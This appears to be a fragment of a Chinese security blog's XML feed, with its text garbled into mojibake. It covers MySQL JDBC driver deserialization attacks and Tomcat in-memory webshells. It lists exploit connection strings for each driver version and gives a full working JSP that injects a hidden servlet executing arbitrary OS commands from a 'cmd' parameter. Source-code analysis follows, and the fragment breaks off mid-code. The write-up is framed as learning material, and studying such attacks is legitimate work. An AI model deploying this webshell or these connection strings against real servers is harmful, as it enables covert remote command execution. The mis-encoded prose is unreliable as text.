title="å…¶ä»–ç‰ˆæœ¬"></a>å…¶ä»–ç‰ˆæœ¬</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p>å…ˆè¯´ä¸€ä¸‹ç”±äºç‰ˆæœ¬ä¸åŒå¸¦æ¥çš„æ”¹å˜</p><ol><li>ä»6.0å¼€å§‹ä¸»è¦ä½¿ç”¨çš„åŒ…åä»Â·<code>com.mysql</code>å˜ä¸ºäº†<code>com.mysql.cj</code>,æ‰€ä»¥<code>ServerStatusDiffInterceptor</code>æ‰€åœ¨ä½ç½®ä¹Ÿæœ‰æ‰€æ”¹å˜ã€‚</li><li>5.1.11-6.0.6ä½¿ç”¨çš„interceptorså±æ€§ä¸ºstatementInterceptorsï¼Œ8.0ä»¥ä¸Šä½¿ç”¨çš„ä¸ºqueryInterceptorsã€‚</li><li>5.1.11ä»¥ä¸‹ï¼Œæ— æ³•ç›´æ¥é€šè¿‡è¿æ¥è§¦å‘ï¼šåœ¨æ‰§è¡ŒgetConnectionæ—¶ï¼Œä¼šæ‰§è¡Œåˆ°com.mysql.jdbc.ConnectionImplä¸­</li></ol><p>å„ç‰ˆæœ¬æœ€åéƒ½æ˜¯éœ€è¦åˆ°getObjectæ–¹æ³•é‡Œé¢å»è¿›è¡Œååºåˆ—åŒ–</p><h3 id="510-5110"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h3><p>è¿æ¥ä¸²å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><p>è¿æ¥ä¹‹åéœ€è¦æ‰§è¡ŒæŸ¥è¯¢</p><h3 id="5111-5xxx"><a href="#5-1-11-5-x-xx" class="headerlink" title="5.1.11-5.x.xx"></a>5.1.11-5.x.xx</h3><p>è¿æ¥ä¸²å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><h3 id="6x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h3><p>è¿æ¥ä¸²å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><h1 id="detectcustomcollationsé“¾"><a href="#detectCustomCollationsé“¾" class="headerlink" title="detectCustomCollationsé“¾"></a>detectCustomCollationsé“¾</h1><h2 id="å„ç‰ˆæœ¬è¿æ¥ä¸²"><a href="#å„ç‰ˆæœ¬è¿æ¥ä¸²" class="headerlink" title="å„ç‰ˆæœ¬è¿æ¥ä¸²"></a>å„ç‰ˆæœ¬è¿æ¥ä¸²</h2><p>å…ˆç»™å‡ºå„ç‰ˆæœ¬çš„è¿æ¥ä¸²</p><ul><li>5.1.19-5.1.28ï¼šjdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.29-5.1.48ï¼šjdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.49ï¼šä¸å¯ç”¨</li><li>6.0.2-6.0.6ï¼šjdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>8.x.x ï¼šä¸å¯ç”¨</li></ul><p>è¯¥é“¾å­ååºåˆ—åŒ–çš„ç‚¹ä¹Ÿæ˜¯åœ¨resultSetToMap()æ–¹æ³•é‡Œé¢</p><p>payloadçš„ä¸åŒä¸»è¦åœ¨äºæœ‰äº›ç‰ˆæœ¬ä¼šå¯¹detectCustomCollationså‚æ•°è¿›è¡Œæ ¡éªŒä¹‹åæ‰ä¼šåˆ°ååºåˆ—åŒ–ç‚¹é‡Œé¢å»ã€‚</p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ-1" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><h3 id="5119-5140"><a href="#5-1-19-5-1-40" class="headerlink" title="5.1.19-5.1.40"></a>5.1.19-5.1.40</h3><p>è¿™é‡Œçš„åˆ©ç”¨åˆ©ç”¨é“¾æ¯”è¾ƒç®€å•ï¼Œåœ¨getConnectionçš„æ—¶å€™ä¼šè°ƒç”¨åˆ°**com.mysql.jdbc.ConnectionImpl#buildCollationMapping()**æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410030920363.png" alt="image-20241003092042235"></p><p>è¿™é‡Œæ‰§è¡Œäº†SHOW COLLATIONæŸ¥è¯¢è¯­å¥ï¼Œç„¶åè°ƒç”¨äº†resultSetToMap</p><h3 id="5141-5148"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h3><p>è¯¥ç‰ˆæœ¬çš„buildCollationMapping()æ–¹æ³•ä¸å†è°ƒç”¨resultSetToMapæ–¹æ³•ï¼Œä½†æ˜¯ç›´æ¥è°ƒç”¨äº†getObjectæ–¹æ³•ï¼Œæ‰€ä»¥payloadä¹Ÿæ²¡å˜åŒ–</p><p><img src="https://cdn.clown2024.cn/202410030924201.png" alt="image-20241003092445101"></p><h3 id="5149"><a href="#5-1-49" class="headerlink" title="5.1.49"></a>5.1.49</h3><p>è¯¥ç‰ˆæœ¬å°±ä¸å†è°ƒç”¨getObjectæ–¹æ³•ï¼Œæ‰€ä»¥é“¾å­ä¹Ÿå°±ä¸å¯ç”¨äº†</p><h3 id="602-606"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h3><p>è¯¥ç‰ˆæœ¬resultSetToMapåˆå›æ¥äº†</p><p><img src="https://cdn.clown2024.cn/202410030933152.png" alt="image-20241003093358073"></p><h3 id="8xx"><a href="#8-x-x" class="headerlink" title="8.x.x"></a>8.x.x</h3><p>8.0ä»¥ä¸Šä¸å†åœ¨com.mysql.cj.jdbc.ConnectionImplä¸­ç›´æ¥æ‰§è¡ŒåŠè·å–â€SHOW COLLATIONâ€è¯­å¥ï¼Œè°ƒç”¨é“¾æ›´æ”¹ï¼Œä¸å†è°ƒç”¨getObject()æ–¹æ³•ï¼Œæ­¤é“¾å¤±æ•ˆ</p><h1 id="mysqlæ¶æ„æœåŠ¡å™¨"><a href="#mysqlæ¶æ„æœåŠ¡å™¨" class="headerlink" title="mysqlæ¶æ„æœåŠ¡å™¨"></a>mysqlæ¶æ„æœåŠ¡å™¨</h1><p>èµ·æ¶æ„çš„mysqlæœåŠ¡è¿˜å¯ä»¥ç”¨fnmsdå¸ˆå‚…çš„<a href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Serveré¡¹ç›®</a>ï¼ˆè¿™ä¸ªæˆ‘æ²¡è·‘èµ·æ¥ï¼‰</p><p>è¿˜æ¨èä¸€ä¸ªjavaå†™çš„å¸¦guiçš„é¡¹ç›®ï¼š<a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¼ ç»Ÿwebåº”ç”¨å‹å†…å­˜é©¬</title>
      <link href="/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>è¿™é‡Œæ˜¯æœ¬èœé¸¡å¼€å§‹å­¦ä¹ å†…å­˜é©¬çš„èµ·å§‹æ–‡ç« </p><p>æœ‰å…³å†…å­˜é©¬çš„è®¤çŸ¥å¯ä»¥çœ‹çœ‹su18å¸ˆå‚…çš„è¿™ç¯‡æ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ">https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ</a></p><p>æœ‰å…³tomcatæºç åˆ†æçš„æ–‡ç« ï¼š<a href="https://blog.csdn.net/u010883443/article/details/107463782">Tomcatæºç åˆè¯†ä¸€ Tomcatæ•´ç†æµç¨‹å›¾_tomcatæµç¨‹å›¾-CSDNåšå®¢</a></p><p>ç„¶åè¿™é‡Œæœ‰ä¸€ç¯‡æ€»ç»“å¾—ç‰¹åˆ«å…¨å¾—å†…å­˜é©¬æ–‡ç« ï¼š<a href="https://paper.seebug.org/3120/">https://paper.seebug.org/3120/</a></p><p>è¿™é‡Œæ”¾ä¸€å¼ æ–‡ç« ä¸­çš„æºç åˆ†æçš„åˆå§‹åŒ–æµç¨‹å›¾ï¼š</p><p><img src="https://cdn.clown2024.cn/202409161536558.png" alt="å†…å­˜é©¬æµç¨‹"></p><p>åšä¸ªå‚è€ƒå¯¹å¤§è‡´æµç¨‹æœ‰ä¸ªæ¦‚å¿µ</p><blockquote><p> è°ƒè¯•çš„æ—¶å€™æˆ‘çªç„¶å‘ç°ä¸åº”è¯¥å¼€å¯tomcatçš„è‡ªåŠ¨æ‰“å¼€æµè§ˆå™¨ï¼Œè¿™æ ·è°ƒè¯•è®¿é—®å‰æˆ–è€…è®¿é—®åçš„é€»è¾‘æ˜¯æ‰ä¸ä¼šé‚£ä¹ˆä¹±ğŸ˜¢</p><p> å› ä¸ºä»–é»˜è®¤æ˜¯åœ¨æˆ‘ä»¬è®¿é—®åæ‰ä¼šå»åˆ›å»ºå®ä¾‹</p></blockquote><h1 id="servletå†…å­˜é©¬"><a href="#Servletå†…å­˜é©¬" class="headerlink" title="Servletå†…å­˜é©¬"></a>Servletå†…å­˜é©¬</h1><h2 id="ç®€å•demo"><a href="#ç®€å•demo" class="headerlink" title="ç®€å•demo"></a>ç®€å•demo</h2><p>å…ˆå†™ä¸€ä¸ªç®€å•çš„demoç„¶åå†åˆ†æä¸€ä¸‹åŸç†å§ï¼Œå…ˆçœ‹çœ‹æ•ˆæœ</p><blockquote><p>è¿™é‡Œç”¨äº†ä½¿ç”¨äº†tomcat8ï¼Œtomcat10ç”¨é‚£ä¸ªdemoæœ‰äº›ç±»æ‰¾ä¸åˆ°</p><p>è¦çœ‹æºç çš„è¯éœ€è¦å¯¼å…¥å¯¹åº”tomcatç‰ˆæœ¬çš„ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.50<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯tomcatçš„æ ¸å¿ƒä¾èµ–ï¼Œèµ·æœåŠ¡çš„è¿‡ç¨‹æºç åŸºæœ¬éƒ½åœ¨è¿™é‡Œ</p></blockquote><p>ç¼–å†™ä¸€ä¸ªservletå†…å­˜é©¬çš„æ­¥éª¤ï¼š</p><ul><li>æ‰¾åˆ°StandardContext</li><li>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„servlet</li><li>åˆ›å»ºWapperå¯¹è±¡</li><li>è®¾ç½®Servletçš„LoadOnStartUpçš„å€¼</li><li>è®¾ç½®Servletçš„Name</li><li>è®¾ç½®Servletå¯¹åº”çš„Class</li><li>å°†Servletæ·»åŠ åˆ°contextçš„childrenä¸­</li><li>å°†urlè·¯å¾„å’Œservletç±»åšæ˜ å°„</li></ul><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.Servlet&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        appctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletURL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/&quot;</span> + getRandomString();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Servlet&quot;</span> + getRandomString();<br>        <span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                &#123;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                    servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>                    <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>                    out.println(output);<br>                    out.flush();<br>                    out.close();<br>                &#125;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>            &#125;<br>        &#125;;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>        wrapper.setName(servletName);<br>        wrapper.setServlet(servlet);<br>        wrapper.setServletClass(servlet.getClass().getName());<br>        wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>        standardContext.addChild(wrapper);<br>        standardContext.addServletMappingDecoded(servletURL, servletName);<br>        response.getWriter().write(<span class="hljs-string">&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletURL + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletName + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/test&quot;</span> + servletURL + <span class="hljs-string">&quot;?cmd=echo ä¸–ç•Œï¼Œä½ å¥½ï¼&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> e.getMessage();<br>        response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">outError</span> <span class="hljs-operator">=</span> response.getWriter();<br>        outError.println(<span class="hljs-string">&quot;Error: &quot;</span> + errorMessage);<br>        outError.flush();<br>        outError.close();<br>    &#125;<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;%!<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getRandomString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">characters</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">randomString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (Math.random() * characters.length());<br>            randomString.append(characters.charAt(index));<br>        &#125;<br>        <span class="hljs-keyword">return</span> randomString.toString();<br>    &#125;<br>%&gt;<br><br></code></pre></td></tr></table></figure><p>æ‰“å…¥åæ•ˆæœ</p><p><img src="https://cdn.clown2024.cn/202409161601686.png" alt="image-20240916160158629"></p><p>ç„¶åå°±å¯ä»¥å»è®¿é—®å¯¹åº”è·¯ç”±æ‰§è¡Œå‘½ä»¤</p><p><img src="https://cdn.clown2024.cn/202409161602929.png" alt="image-20240916160242879"></p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>servletå†…å­˜é©¬å°±æ˜¯å»æ‰¾åˆ°æºç ä¸­æ³¨å†Œservletçš„å†…å®¹ï¼Œç„¶åæˆ‘ä»¬é‡å¤ä¸€éç›´æ¥æ³¨å†Œè‡ªå·±çš„servletå³å¯</p><p>è¿™é‡Œæˆ‘ä»¬æ˜¯å»æ‰¾æºç ä¸­å¦‚ä½•å°†web.xmlçš„é…ç½®å˜æˆservletçš„è¿‡ç¨‹</p><p>é¦–å…ˆæ‰¾åˆ°åŠ è½½web.xmlçš„ContextConfig#webconfig()</p><p><img src="https://cdn.clown2024.cn/202409161629329.png" alt="image-20240916162907251"></p><p>ç„¶åé‡Œé¢å°±æ˜¯è¯»å–web.xmlçš„ä¸€äº›ä»£ç ï¼Œé‡è¦åœ¨ç¬¬ä¹ä¸ªæ­¥éª¤</p><p><img src="https://cdn.clown2024.cn/202409161630551.png" alt="image-20240916163037486"></p><p>è¿™é‡Œæ³¨é‡Šå°†web.xmlåº”ç”¨äºContextï¼Œè°ƒç”¨ContextConfig#configureContextæ–¹æ³•</p><p>è·Ÿè¿›å»çœ‹ä¸€çœ‹</p><p><img src="https://cdn.clown2024.cn/202409161637697.png" alt="image-20240916163737624"></p><p>è¿™é‡Œæœ‰å¾ˆå¤šçš„æ“ä½œéƒ½æ˜¯é€šè¿‡contextåŠ è½½è¿›å»ï¼Œè¿™é‡Œçš„contextå°±æ˜¯æˆ‘ä»¬çš„StandardContextï¼Œtomcatæ¯ä¸ªå®¹å™¨å¯åŠ¨æ—¶éƒ½ä¼šé€šè¿‡ä¸€ä¸ªStandard***#startInternal()æ–¹æ³•æ¥å¯åŠ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å…·ä½“çš„contextå°±æ˜¯StandardContextå¼€å§‹çš„ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒè¯•çœ‹çœ‹è¿™ä¸ªcontext</p><p><img src="https://cdn.clown2024.cn/202409161650754.png" alt="image-20240916165022674"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æˆ‘ä»¬çš„StandardContextï¼Œç„¶åè¿™ä¸ªwebxmlé‡Œé¢å°±æœ‰è§£ææˆ‘ä»¬web.xmlæ–‡ä»¶æ‹¿åˆ°çš„servlet</p><p><img src="https://cdn.clown2024.cn/202409161651016.png" alt="image-20240916165127949"></p><p>è¿™ä¸ªHelloå°±æ˜¯æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„ï¼Œ<strong>æ‰€ä»¥ç¬¬ä¸€æ­¥çš„æ‰¾åˆ°StandardContextï¼Œå…¶å®å°±æ˜¯è·å–å½“å‰åº”ç”¨çš„contextå®ä¾‹</strong>ï¼Œç„¶åå¾€é‡Œé¢æ³¨å†Œservletï¼Œæˆ‘ä»¬å›åˆ°configureContextæ–¹æ³•ç»§ç»­å¾€ä¸‹æ‰¾å…³é”®åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202409161658274.png" alt="image-20240916165818197"></p><p>è¿™é‡Œéå†æˆ‘ä»¬çš„servletç„¶ååˆ›å»ºwrapperï¼Œæˆ‘ä»¬çŸ¥é“wrapperå°±æ˜¯ç”¨æ¥å°è£…servletçš„</p><p><img src="https://cdn.clown2024.cn/202409161701466.png" alt="image-20240916170126390"></p><p>ç„¶åè¿™é‡Œçš„wrapperå°±æ˜¯æˆ‘ä»¬çŸ¥é“çš„tomcatå®šä¹‰çš„Wrapperçš„å®ç°ç±»ï¼Œæ‹¿åˆ°wrapperä¹‹åç»§ç»­å¾€ä¸‹ï¼Œçœ‹ä¸€ä¸‹å…³é”®çš„setæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409161708368.png" alt="image-20240916170822326"></p><p>ç¬¬ä¸€æ­¥å…ˆå¯¹loadOnStartupçš„å€¼è¿›è¡Œè®¾ç½®ï¼Œè¿™ä¸ªå€¼ä»£è¡¨çš„æ˜¯Servletåœ¨å¯åŠ¨æ—¶çš„åŠ è½½é¡ºåºï¼Œå¦‚æœè®¾ç½®ä¸ºè´Ÿæ•°ï¼Œé‚£ä¹ˆServletå°†åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶æ‰è¢«åŠ è½½</p><p><img src="https://cdn.clown2024.cn/202409161715978.png" alt="image-20240916171559932"></p><p>è¿™ä¸€æ­¥å°±æ˜¯è¿™æ˜¯servletçš„name</p><p><img src="https://cdn.clown2024.cn/202409161716418.png" alt="image-20240916171636372"></p><p>è¿™ä¸€æ­¥è®¾ç½®servletClassç”¨çš„æ˜¯å…¨ç±»å</p><p><img src="https://cdn.clown2024.cn/202409161719067.png" alt="image-20240916171908029"></p><p>è¿™ä¸€æ­¥å°†å‰é¢çš„wrapperæ·»åŠ åˆ°contexté‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202409161721789.png" alt="image-20240916172036567"></p><p>ç„¶åè¿™æ˜¯å°†å‰é¢çš„servletéå†å®Œä¹‹åï¼Œå†éå†servletMappingï¼Œå¾€contexté‡Œé¢æ·»åŠ æ˜ å°„ï¼Œä¸‹é¢æ˜¯servletMappings</p><p><img src="https://cdn.clown2024.cn/202409161722241.png" alt="image-20240916172220190"></p><p>ç„¶åè¿™å°±æ˜¯æ•´ä¸ªæ³¨å†Œçš„æµç¨‹ï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰å®ä¾‹åŒ–æˆ‘ä»¬å†™çš„Servletç±»ï¼Œå› ä¸ºå®ƒå­˜åœ¨æ‡’åŠ è½½æœºåˆ¶ï¼Œéœ€è¦æˆ‘ä»¬å»è®¿é—®çš„æ—¶å€™æ‰ä¼šåˆ›å»ºå®ä¾‹ï¼Œä½†å¦‚æœæˆ‘ä»¬è‡ªå·±åŠ¨æ€åœ¨é¡µé¢å†™å°±ä¼šèµ°ä¸åˆ°é‚£ä¸ªæµç¨‹ï¼Œéœ€è¦æˆ‘ä»¬ç›´æ¥å°†å®ä¾‹ç±»æ”¾è¿›å»</p><p>ç°åœ¨çŸ¥é“æ‰€æœ‰æµç¨‹æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å†™å†…å­˜é©¬äº†ï¼Œè¿™é‡Œæ˜¯æ ¹æ®ç»„é•¿çš„æµç¨‹æ¥å†™ï¼Œæ¯”è¾ƒç®€å•</p><p>ç¬¬ä¸€æ­¥æ‰¾åˆ°standardContextï¼Œè¿™ä¹Ÿæ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“jspé‡Œé¢æ˜¯æœ‰requestå¯¹è±¡çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡requestå¯¹è±¡æ¥è·å–standardContext</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>System.out.println(servletContext);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆçœ‹çœ‹request#getServletContextè¿”å›çš„å¯¹è±¡</p><p><img src="https://cdn.clown2024.cn/202409161746714.png" alt="image-20240916174627626"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾€é‡Œé¢ç¬¬äºŒå±‚çš„contextå°±æ˜¯StandardContextï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨åå°„æ¥è·å–</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.è·å–standardContext</span><br>        <span 